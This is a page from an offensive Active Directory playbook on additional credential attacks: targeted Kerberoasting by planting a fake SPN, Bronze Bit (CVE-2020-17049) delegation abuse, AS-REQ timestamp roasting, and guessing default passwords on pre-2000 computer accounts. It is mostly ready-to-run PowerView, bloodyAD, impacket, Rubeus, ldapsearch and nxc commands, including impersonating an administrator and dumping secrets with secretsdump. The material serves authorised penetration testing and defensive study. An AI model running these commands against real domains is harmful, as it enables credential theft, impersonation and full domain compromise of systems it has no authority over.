---
title: "20 · Credential Attacks (Additional)"
---

# 20 · Credential Attacks (Additional)

> Targeted Kerberoast, Bronze Bit, AS-REQ roasting, pre-2000 computer accounts.

!!! note "Phase overview"
    Specialized credential techniques that fill the gaps when the canonical attacks (3.1, 3.2, 4.1) don't apply.

### 20.1 · Targeted Kerberoasting

!!! info "Why this works / how it chains"

    Most users don't have an SPN, so they're not Kerberoastable by default. With GenericWrite you can SET an SPN on them, then immediately Kerberoast (TGS for that fake SPN is encrypted with the user's hash). Always clean up the SPN afterwards.

!!! warning "What leads here"
    - GenericWrite on a user account
    - Want to Kerberoast a specific user who has no SPN
    - Set fake SPN → request ticket → crack

```bash title="Set SPN, roast, clean up"
# Some examples:

# Set SPN on target user (GenericWrite required)
# PowerView
Set-DomainObject -Identity targetuser \
  -Set @{serviceprincipalname='fake/spn.domain.local'}

# bloodyAD
bloodyAD set object 'targetuser' \
  servicePrincipalName -v 'fake/spn.domain.local'

# Now Kerberoast them
impacket-GetUserSPNs domain.local/youruser:pass \
  -dc-ip <DC_IP> \
  -request-user targetuser

# Cleanup after
Set-DomainObject -Identity targetuser \
  -Clear serviceprincipalname
```


### 20.2 · Bronze Bit (CVE-2020-17049)

!!! info "Why this works / how it chains"

    The 'sensitive' flag tells the KDC not to forward this user's tickets. Bronze Bit forces the forwardable bit on the S4U2Proxy ticket regardless. Use impacket-getST -force-forwardable.

!!! warning "What leads here"
    - Constrained delegation configured
    - Target account marked 'Account is sensitive and cannot be delegated'
    - Normally S4U2Proxy would fail : Bronze Bit bypasses this

```bash title="force-forwardable S4U2Proxy"
impacket-getST \
  -spn cifs/target.domain.local \
  -impersonate administrator \
  -dc-ip <DC_IP> \
  -force-forwardable \
  domain.local/delegationuser:pass

export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass target.domain.local
```


### 20.3 · Kerberos Roasting via AS-REQ

!!! info "Why this works / how it chains"

    Capture an AS-REQ encrypted timestamp and crack it offline (similar to ASREPRoast but for users with preauth enabled). Requires MITM position. Hash mode 7500.

```powershell title="Rubeus opsec asktgt"
.\Rubeus.exe asktgt /user:targetuser /domain:domain.local \
  /dc:<DC_IP> /opsec /nowrap
# Captures the AS-REQ encrypted timestamp → crack with hashcat -m 7500
```


### 20.4 · Pre-2000 Computer Accounts

!!! info "Why this works / how it chains"

    Accounts created with the pre-2000 compatibility flag have a default password equal to the lowercase computer name. The userAccountControl bitmask filter (1.2.840.113556.1.4.803:=4096) finds them. Always worth a try in legacy environments.

!!! warning "What leads here"
    - Old computer accounts with the 'Pre-Windows 2000' compatible flag
    - Default password = lowercase computer name (without $)
    - Limited rights but useful for Kerberoasting and enumeration

```bash title="Find + try default password"
# Find pre-2000 computer accounts
ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" \
  "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=4096))" \
  sAMAccountName

# Try default password: hostname (lowercase, no $)
nxc smb <DC_IP> -u 'OLDPC$' -p 'oldpc' -d domain.local

# Use for enumeration/Kerberoasting if successful
impacket-GetUserSPNs domain.local/'OLDPC$':oldpc \
  -dc-ip <DC_IP> -request
```

